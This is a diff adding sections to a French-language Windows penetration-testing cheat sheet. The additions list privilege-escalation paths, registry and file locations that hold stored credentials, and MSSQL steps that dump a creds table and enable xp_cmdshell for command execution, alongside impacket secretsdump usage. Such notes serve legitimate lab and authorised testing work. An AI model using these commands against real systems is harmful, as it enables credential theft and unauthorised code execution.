@@ -1,5 +1,17 @@
 # Windows
 
+## Chemins Courants
+
+| Finding | Attaque |
+| :--- | :--- |
+| SeImpersonatePrivilege | SigmaPotato / GodPotato |
+| SeBackupPrivilege | Dump SAM/SYSTEM |
+| AutoLogon credentials dans le registre | WinPEAS trouve automatiquement |
+| Saved credentials | `cmdkey /list` + RunAs |
+| Unquoted service path | Service hijacking |
+| DLL Hijacking | Remplacer la DLL vulnérable |
+| AllExtendedRights sur user | Reset password |
+| Stored credentials | LaZagne |
 ## Commandes utiles
 
 **ExecutionPolicy**
@@ -749,4 +761,28 @@ Downloaded SAM, SYSTEM files
 *Evil-WinRM* PS C:\windows.old\Windows\System32> download SYSTEM
 
 impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+```
+
+## Trouver Plus de Credentials
+
+- **PowerShell history** : `C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
+- **Registry AutoLogon** : `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`
+- **Saved RDP connections** : `HKCU\Software\Microsoft\Terminal Server Client\Servers`
+- **MSSQL credentials** : Si SQL Server tourne, se connecter et chercher une table creds
+
+## MSSQL Exploitation
+
+```shell
+# Si port 1433 trouvé — forwarder via Ligolo si nécessaire
+impacket-mssqlclient 'user'@127.0.0.1 -windows-auth
+
+# Énumérer
+SQL> SELECT name FROM sys.databases;
+SQL> use accounts;
+SQL> SELECT * FROM creds;
+
+# Activer xp_cmdshell pour RCE
+SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+SQL> EXEC xp_cmdshell 'whoami';
 ```
